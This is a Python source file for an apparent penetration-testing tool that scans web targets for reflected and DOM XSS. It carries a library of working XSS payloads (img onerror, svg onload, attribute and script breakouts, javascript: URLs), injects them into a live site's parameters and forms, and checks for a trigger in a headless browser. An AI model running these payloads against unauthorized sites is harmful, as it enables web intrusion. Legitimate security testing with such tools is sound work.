"""
xss_tool — XSS 检测（反射型 + DOM 型）

改进点：
1) 参考 PortSwigger XSS cheat sheet 的向量分层做上下文探测；
2) 支持从页面链接/表单中发现动态参数（例如内容页 / 详情页参数）；
3) 提供反射上下文判定与 DOM source->sink 静态检测，减少机械探测。
"""
from __future__ import annotations

import html
import re
import urllib.parse
from typing import Any

import httpx

from tools.web_utils import extract_html_surface, normalize_string_list

_UA = "Mozilla/5.0 (PentestPilot/2.0)"
_TIMEOUT = 15.0

_COMMON_PARAM_GUESSES = [
    "q",
    "search",
    "query",
    "keyword",
    "id",
    "name",
    "title",
    "message",
    "comment",
    "redirect",
    "url",
]

_DYNAMIC_PATH_MARKERS = (
    "/cat",
    "/post",
    "/item",
    "/view",
    "/search",
    "/admin",
    "/upload",
)
_DYNAMIC_EXTENSIONS = (".php", ".asp", ".aspx", ".jsp", ".do", ".action")

# 向量族：思路来自 PortSwigger XSS cheat sheet/contexts（按上下文分组，不照搬完整词库）
_VECTOR_LIBRARY: dict[str, dict[str, str]] = {
    "html_img_onerror": {
        "category": "html_text",
        "payload": '<img src=x onerror=alert("{marker}")>',
    },
    "html_svg_onload": {
        "category": "html_text",
        "payload": '<svg onload=alert("{marker}")>',
    },
    "scriptless_details_toggle": {
        "category": "html_text",
        "payload": '<details open ontoggle=alert("{marker}")>',
    },
    "attr_autofocus_onfocus": {
        "category": "html_attr",
        "payload": '" autofocus onfocus=alert("{marker}") x="',
    },
    "attr_single_onmouseover": {
        "category": "html_attr",
        "payload": "' onmouseover=alert(\"{marker}\") x='",
    },
    "js_breakout_single_quote": {
        "category": "javascript",
        "payload": "';alert(\"{marker}\")//",
    },
    "js_breakout_backslash": {
        "category": "javascript",
        "payload": "\\';alert(\"{marker}\")//",
    },
    "js_template_literal": {
        "category": "javascript",
        "payload": '${alert("{marker}")}',
    },
    "script_tag_breakout": {
        "category": "javascript",
        "payload": '</script><img src=x onerror=alert("{marker}")>',
    },
    "url_javascript_protocol": {
        "category": "url_attr",
        "payload": 'javascript:alert("{marker}")',
    },
    "encoded_apos_js_breakout": {
        "category": "javascript",
        "payload": "&apos;-alert(&quot;{marker}&quot;)-&apos;",
    },
}

_CONTEXT_VECTOR_ORDER: dict[str, list[str]] = {
    "html_text": ["html_img_onerror", "html_svg_onload", "scriptless_details_toggle"],
    "html_attr": ["attr_autofocus_onfocus", "attr_single_onmouseover", "html_img_onerror"],
    "script": ["script_tag_breakout", "js_breakout_single_quote", "js_breakout_backslash", "js_template_literal"],
    "event_attr": ["encoded_apos_js_breakout", "js_breakout_single_quote", "attr_autofocus_onfocus"],
    "url_attr": ["url_javascript_protocol", "attr_autofocus_onfocus"],
    "unknown": ["html_img_onerror", "attr_autofocus_onfocus", "js_breakout_single_quote"],
}

_DOM_FLOW_PATTERNS = [
    (
        "innerHTML",
        re.compile(
            r"(?:innerHTML|outerHTML)\s*=\s*[^;\n]{0,600}"
            r"(?:location\.(?:hash|search|href|pathname)|document\.(?:URL|documentURI|referrer)|window\.name)",
            re.IGNORECASE | re.DOTALL,
        ),
    ),
    (
        "insertAdjacentHTML",
        re.compile(
            r"insertAdjacentHTML\s*\([^)]{0,800}"
            r"(?:location\.(?:hash|search|href|pathname)|document\.(?:URL|documentURI|referrer)|window\.name)",
            re.IGNORECASE | re.DOTALL,
        ),
    ),
    (
        "document.write",
        re.compile(
            r"document\.write(?:ln)?\s*\([^)]{0,800}"
            r"(?:location\.(?:hash|search|href|pathname)|document\.(?:URL|documentURI|referrer)|window\.name)",
            re.IGNORECASE | re.DOTALL,
        ),
    ),
    (
        "js_exec_sink",
        re.compile(
            r"(?:eval|setTimeout|setInterval|Function)\s*\([^)]{0,800}"
            r"(?:location\.(?:hash|search|href|pathname)|document\.(?:URL|documentURI|referrer)|window\.name)",
            re.IGNORECASE | re.DOTALL,
        ),
    ),
]


def xss_scan(
    target: str,
    params: list[str] | str | None = None,
    deep: bool = True,
    max_urls: int = 8,
    max_requests: int = 70,
) -> dict[str, Any]:
    """
    扫描目标 URL 的 XSS 漏洞。

    Args:
        target: 目标 URL（含或不含参数）
        params: 指定额外测试参数（逗号分隔字符串或列表）
        deep: 是否从页面中提取同源链接/表单并扩展测试
        max_urls: 最多扫描的候选 URL 数
        max_requests: 本次扫描最大请求数（防止过度探测）
    """
    manual_params = normalize_string_list(params)
    request_budget = max(10, min(int(max_requests), 300))
    url_budget = max(1, min(int(max_urls), 20))

    reflected_results: list[dict[str, Any]] = []
    collected_pages: dict[str, str] = {}

    with httpx.Client(
        follow_redirects=True,
        timeout=_TIMEOUT,
        verify=False,
        headers={"User-Agent": _UA},
    ) as client:
        discovery = _discover_candidate_targets(
            client=client,
            target=target,
            manual_params=manual_params,
            deep=deep,
            max_urls=url_budget,
        )
        candidate_urls = discovery["candidate_urls"]
        discovered_params = discovery["discovered_params"]
        for page in discovery["pages"]:
            collected_pages[page["url"]] = page["body"]

        request_count = 0
        for candidate_url in candidate_urls:
            if request_count >= request_budget:
                break

            parsed_candidate = urllib.parse.urlparse(candidate_url)
            existing_params = dict(urllib.parse.parse_qsl(parsed_candidate.query, keep_blank_values=True))
            base_url = parsed_candidate._replace(query="", fragment="").geturl()

            candidate_params = _build_param_candidates(existing_params, manual_params, discovered_params)
            if not candidate_params:
                continue

            for param in candidate_params:
                if request_count >= request_budget:
                    break

                marker = _build_marker(param, request_count)
                probe_response = _request_with_param(
                    client=client,
                    base_url=base_url,
                    existing_params=existing_params,
                    param=param,
                    payload=marker,
                )
                request_count += 1

                if probe_response.get("error"):
                    continue

                body = str(probe_response.get("body", ""))
                collected_pages.setdefault(str(probe_response.get("url", base_url)), body)
                probe_analysis = _analyze_reflection(body, marker=marker, payload=marker)
                if not probe_analysis["marker_reflected"]:
                    continue

                vector_ids = _select_vectors(probe_analysis["contexts"])
                for vector_id in vector_ids:
                    if request_count >= request_budget:
                        break
                    vector = _VECTOR_LIBRARY[vector_id]
                    payload = vector["payload"].format(marker=marker)

                    test_response = _request_with_param(
                        client=client,
                        base_url=base_url,
                        existing_params=existing_params,
                        param=param,
                        payload=payload,
                    )
                    request_count += 1

                    if test_response.get("error"):
                        continue

                    test_body = str(test_response.get("body", ""))
                    collected_pages.setdefault(str(test_response.get("url", base_url)), test_body)
                    analysis = _analyze_reflection(test_body, marker=marker, payload=payload)
                    if not _should_report(analysis):
                        continue

                    reflected_results.append({
                        "type": "reflected_xss",
                        "param": param,
                        "probe": payload,
                        "vector_id": vector_id,
                        "category": vector["category"],
                        "url": str(test_response.get("url", base_url)),
                        "status_code": int(test_response.get("status_code", 0) or 0),
                        "reflected": analysis["raw_payload_reflected"],
                        "in_xss_context": analysis["in_xss_context"],
                        "contexts": analysis["contexts"],
                        "marker_reflected": analysis["marker_reflected"],
                        "html_escaped": analysis["html_escaped"],
                        "confidence": analysis["confidence"],
                        "evidence": _extract_context(test_body, marker, 120),
                    })
                    if analysis["confidence"] == "high":
                        break

        reflected_results = _dedupe_reflected(reflected_results)

        static_dom = _dom_xss_static_scan(collected_pages)
        dynamic_dom = _dom_xss_dynamic_scan(target, candidate_urls) if _playwright_available() else []
        dom_results = _dedupe_dom(static_dom + dynamic_dom)

    return {
        "target": target,
        "vulnerable": bool(reflected_results or dom_results),
        "reflected_xss": reflected_results,
        "dom_xss": dom_results,
        "scanned_urls": candidate_urls,
        "params_tested": sorted(set(manual_params + discovered_params)),
        "vector_source": "PortSwigger XSS Cheat Sheet (context-based families)",
    }


def _discover_candidate_targets(
    client: httpx.Client,
    target: str,
    manual_params: list[str],
    deep: bool,
    max_urls: int,
) -> dict[str, Any]:
    candidate_urls: list[str] = []
    discovered_params: set[str] = set(manual_params)
    pages: list[dict[str, str]] = []

    try:
        response = client.get(target)
    except Exception:
        return {
            "candidate_urls": [target],
            "discovered_params": manual_params,
            "pages": [],
        }

    final_url = str(response.url)
    body = response.text or ""
    pages.append({"url": final_url, "body": body})
    candidate_urls.append(final_url)

    parsed_final = urllib.parse.urlparse(final_url)
    for key, _ in urllib.parse.parse_qsl(parsed_final.query, keep_blank_values=True):
        if key:
            discovered_params.add(key)

    if not deep:
        return {
            "candidate_urls": candidate_urls[:max_urls],
            "discovered_params": sorted(discovered_params),
            "pages": pages,
        }

    surface = extract_html_surface(final_url, body)
    raw_links = list(surface.get("links", [])) + list(surface.get("interesting_links", []))
    for raw_link in raw_links[:80]:
        normalized = _normalize_candidate_url(final_url, raw_link)
        if not normalized or not _same_origin(final_url, normalized):
            continue

        parsed_link = urllib.parse.urlparse(normalized)
        for key, _ in urllib.parse.parse_qsl(parsed_link.query, keep_blank_values=True):
            if key:
                discovered_params.add(key)

        if _looks_dynamic_url(parsed_link):
            _append_unique(candidate_urls, normalized, max_urls)

    for form in surface.get("forms", [])[:12]:
        action = _normalize_candidate_url(final_url, form.get("action", "") or final_url)
        if not action or not _same_origin(final_url, action):
            continue

        form_params = []
        for item in form.get("inputs", []):
            name = str(item.get("name", "")).strip()
            if name:
                discovered_params.add(name)
                form_params.append(name)

        method = str(form.get("method", "GET")).upper()
        if method == "GET" and form_params:
            parsed_action = urllib.parse.urlparse(action)
            merged = dict(urllib.parse.parse_qsl(parsed_action.query, keep_blank_values=True))
            for name in form_params[:3]:
                merged.setdefault(name, "1")
            with_query = parsed_action._replace(query=urllib.parse.urlencode(merged, doseq=True)).geturl()
            _append_unique(candidate_urls, with_query, max_urls)
        elif _looks_dynamic_url(urllib.parse.urlparse(action)):
            _append_unique(candidate_urls, action, max_urls)

    return {
        "candidate_urls": candidate_urls[:max_urls],
        "discovered_params": sorted(discovered_params),
        "pages": pages,
    }


def _build_param_candidates(
    existing_params: dict[str, str],
    manual_params: list[str],
    discovered_params: list[str],
) -> list[str]:
    params: list[str] = []
    for name in list(existing_params.keys()) + manual_params + discovered_params + _COMMON_PARAM_GUESSES:
        cleaned = str(name).strip()
        if cleaned and cleaned not in params:
            params.append(cleaned)
    return params[:10]


def _select_vectors(contexts: list[str]) -> list[str]:
    if not contexts:
        return _CONTEXT_VECTOR_ORDER["unknown"][:]

    ordered: list[str] = []
    for context in contexts:
        for vector_id in _CONTEXT_VECTOR_ORDER.get(context, _CONTEXT_VECTOR_ORDER["unknown"]):
            if vector_id not in ordered:
                ordered.append(vector_id)
    if not ordered:
        ordered = _CONTEXT_VECTOR_ORDER["unknown"][:]
    return ordered[:5]


def _request_with_param(
    client: httpx.Client,
    base_url: str,
    existing_params: dict[str, str],
    param: str,
    payload: str,
) -> dict[str, Any]:
    params = dict(existing_params)
    params[param] = payload
    try:
        response = client.get(base_url, params=params)
        return {
            "url": str(response.url),
            "status_code": response.status_code,
            "body": response.text or "",
        }
    except Exception as exc:
        return {"error": str(exc)}


def _analyze_reflection(body: str, marker: str, payload: str) -> dict[str, Any]:
    marker_reflected = marker in body or marker in html.unescape(body)
    payload_reflected_raw = payload in body
    payload_reflected_unescaped = payload in html.unescape(body)
    html_escaped = (html.escape(payload, quote=True) in body) or (html.escape(marker, quote=True) in body)
    contexts = _detect_contexts(body, marker)

    danger_patterns = _danger_patterns(marker)
    dangerous_hit = any(re.search(pattern, body, re.IGNORECASE | re.DOTALL) for pattern in danger_patterns)
    in_xss_context = bool(dangerous_hit or ("script" in contexts and payload_reflected_unescaped))

    confidence = "low"
    if in_xss_context and payload_reflected_raw:
        confidence = "high"
    elif in_xss_context or ("script" in contexts or "event_attr" in contexts or "url_attr" in contexts):
        confidence = "medium"

    return {
        "marker_reflected": marker_reflected,
        "raw_payload_reflected": payload_reflected_raw,
        "payload_reflected_unescaped": payload_reflected_unescaped,
        "html_escaped": html_escaped,
        "contexts": contexts,
        "in_xss_context": in_xss_context,
        "confidence": confidence,
    }


def _should_report(analysis: dict[str, Any]) -> bool:
    if not analysis.get("marker_reflected"):
        return False
    if analysis.get("in_xss_context"):
        return True
    contexts = set(analysis.get("contexts", []))
    if analysis.get("raw_payload_reflected") and {"script", "event_attr", "url_attr", "html_attr"} & contexts:
        return True
    return False


def _detect_contexts(body: str, marker: str) -> list[str]:
    contexts: list[str] = []
    marker_escaped = re.escape(marker)
    patterns = [
        ("script", rf"(?is)<script[^>]*>[^<]{{0,800}}{marker_escaped}[^<]{{0,800}}</script>"),
        ("event_attr", rf"(?is)on\w+\s*=\s*['\"][^'\"]{{0,800}}{marker_escaped}[^'\"]{{0,800}}['\"]"),
        ("url_attr", rf"(?is)(?:href|src|action|formaction)\s*=\s*['\"][^'\"]{{0,800}}{marker_escaped}[^'\"]{{0,800}}['\"]"),
        ("html_attr", rf"(?is)<[^>]+\s+\w+\s*=\s*['\"][^'\"]{{0,800}}{marker_escaped}[^'\"]{{0,800}}['\"][^>]*>"),
        ("html_text", rf"(?is)>[^<]{{0,800}}{marker_escaped}[^<]{{0,800}}<"),
    ]
    for context_name, pattern in patterns:
        if re.search(pattern, body):
            contexts.append(context_name)
    return contexts or ["unknown"]


def _danger_patterns(marker: str) -> list[str]:
    m = re.escape(marker)
    return [
        rf"(?is)<script[^>]*>[^<]{{0,400}}alert\(\s*['\"]?{m}",
        rf"(?is)<(?:img|svg|details|body|iframe)[^>]{{0,300}}on(?:error|load|toggle|focus|mouseover)\s*=\s*[^>]{{0,300}}alert\(\s*['\"]?{m}",
        rf"(?is)on\w+\s*=\s*['\"][^'\"]{{0,300}}alert\(\s*['\"]?{m}",
        rf"(?is)(?:href|src|action|formaction)\s*=\s*['\"]\s*javascript:\s*alert\(\s*['\"]?{m}",
    ]


def _dom_xss_static_scan(pages: dict[str, str]) -> list[dict[str, Any]]:
    results: list[dict[str, Any]] = []
    for url, body in pages.items():
        if not body:
            continue
        surface = extract_html_surface(url, body)
        scripts = surface.get("inline_scripts", [])[:10]
        for snippet in scripts:
            for sink_name, pattern in _DOM_FLOW_PATTERNS:
                match = pattern.search(snippet)
                if not match:
                    continue
                evidence = match.group(0)[:300]
                results.append({
                    "type": "dom_xss_static",
                    "url": url,
                    "sink": sink_name,
                    "probe": "source->sink pattern",
                    "confidence": "medium",
                    "evidence": evidence,
                })
    return results


def _dom_xss_dynamic_scan(target: str, candidate_urls: list[str]) -> list[dict[str, Any]]:
    """使用 Playwright 做轻量 DOM XSS 验证（可选）。"""
    results: list[dict[str, Any]] = []
    try:
        from playwright.sync_api import sync_playwright

        payload = '<img src=x onerror=window._xss_triggered=1>'
        probe_urls = _build_dom_probe_urls(target, candidate_urls, payload)[:8]

        with sync_playwright() as playwright:
            browser = playwright.chromium.launch(headless=True)
            page = browser.new_page()
            page.on("dialog", lambda dialog: dialog.dismiss())

            for probe_url in probe_urls:
                try:
                    page.goto(probe_url, timeout=10000)
                    page.wait_for_timeout(300)
                    triggered = bool(page.evaluate("() => window._xss_triggered === 1"))
                    if triggered:
                        results.append({
                            "type": "dom_xss",
                            "url": probe_url,
                            "probe": payload,
                            "confidence": "high",
                        })
                except Exception:
                    continue

            browser.close()
    except Exception:
        return []
    return results


def _build_dom_probe_urls(target: str, candidate_urls: list[str], payload: str) -> list[str]:
    probe_urls: list[str] = []
    encoded_hash = urllib.parse.quote(payload, safe="")
    _append_unique(probe_urls, f"{target}#{encoded_hash}", 20)

    for url in candidate_urls:
        parsed = urllib.parse.urlparse(url)
        params = dict(urllib.parse.parse_qsl(parsed.query, keep_blank_values=True))
        if params:
            key = next(iter(params.keys()))
            params[key] = payload
            candidate = parsed._replace(query=urllib.parse.urlencode(params, doseq=True)).geturl()
            _append_unique(probe_urls, candidate, 20)
        else:
            injected = parsed._replace(query=urllib.parse.urlencode({"xss": payload})).geturl()
            _append_unique(probe_urls, injected, 20)
    return probe_urls


def _playwright_available() -> bool:
    try:
        import playwright  # noqa: F401
        return True
    except ImportError:
        return False


def _normalize_candidate_url(base_url: str, raw: str) -> str:
    text = str(raw).strip()
    if not text:
        return ""
    lowered = text.lower()
    if lowered.startswith(("javascript:", "data:", "mailto:", "#")):
        return ""
    parsed = urllib.parse.urlparse(urllib.parse.urljoin(base_url, text))
    return parsed._replace(fragment="").geturl()


def _same_origin(base_url: str, candidate_url: str) -> bool:
    base = urllib.parse.urlparse(base_url)
    cand = urllib.parse.urlparse(candidate_url)
    if base.scheme not in {"http", "https"} or cand.scheme not in {"http", "https"}:
        return False
    return (base.hostname or "").lower() == (cand.hostname or "").lower()


def _looks_dynamic_url(parsed: urllib.parse.ParseResult) -> bool:
    path = (parsed.path or "").lower()
    if parsed.query:
        return True
    if any(path.endswith(ext) for ext in _DYNAMIC_EXTENSIONS):
        return True
    if any(marker in path for marker in _DYNAMIC_PATH_MARKERS):
        return True
    return False


def _append_unique(items: list[str], value: str, limit: int) -> None:
    if not value or value in items:
        return
    if len(items) >= limit:
        return
    items.append(value)


def _build_marker(param: str, counter: int) -> str:
    safe_param = re.sub(r"[^a-zA-Z0-9]", "", param)[:8] or "x"
    return f"ppxss{safe_param}{counter:03d}"


def _extract_context(html_body: str, marker: str, context_chars: int = 120) -> str:
    idx = html_body.find(marker)
    if idx == -1:
        idx = html.unescape(html_body).find(marker)
        if idx == -1:
            return ""
    start = max(0, idx - context_chars)
    end = min(len(html_body), idx + len(marker) + context_chars)
    return html_body[start:end]


def _dedupe_reflected(items: list[dict[str, Any]]) -> list[dict[str, Any]]:
    deduped: dict[str, dict[str, Any]] = {}
    for item in items:
        key = f"{item.get('url','')}|{item.get('param','')}|{item.get('vector_id','')}"
        current = deduped.get(key)
        if not current:
            deduped[key] = item
            continue
        rank = {"low": 1, "medium": 2, "high": 3}
        if rank.get(str(item.get("confidence", "low")), 1) > rank.get(str(current.get("confidence", "low")), 1):
            deduped[key] = item
    return sorted(
        deduped.values(),
        key=lambda entry: (
            {"high": 0, "medium": 1, "low": 2}.get(str(entry.get("confidence", "low")), 3),
            str(entry.get("url", "")),
            str(entry.get("param", "")),
        ),
    )


def _dedupe_dom(items: list[dict[str, Any]]) -> list[dict[str, Any]]:
    seen: set[str] = set()
    results: list[dict[str, Any]] = []
    for item in items:
        key = f"{item.get('type','')}|{item.get('url','')}|{item.get('sink','')}|{item.get('probe','')}"
        if key in seen:
            continue
        seen.add(key)
        results.append(item)
    return results
